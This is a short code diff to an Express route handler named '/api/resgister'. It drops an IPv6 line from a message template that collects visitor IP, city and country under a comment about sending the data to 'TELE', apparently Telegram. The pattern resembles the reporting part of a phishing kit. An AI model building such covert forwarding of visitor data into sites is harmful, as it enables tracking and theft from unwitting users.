@@ -26,7 +26,6 @@ app.post('/api/resgister', (req, res) => {
 
     // SEND DATA TO TELE
     const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
-<strong>Ipv6:</strong> ${data.ipv6 ? data.ipv6 : ''}
 <strong>City:</strong> ${data.city ? data.city : ''}
 <strong>Country:</strong> ${data.country ? data.country : ''}
 ------------------------------------------------------------
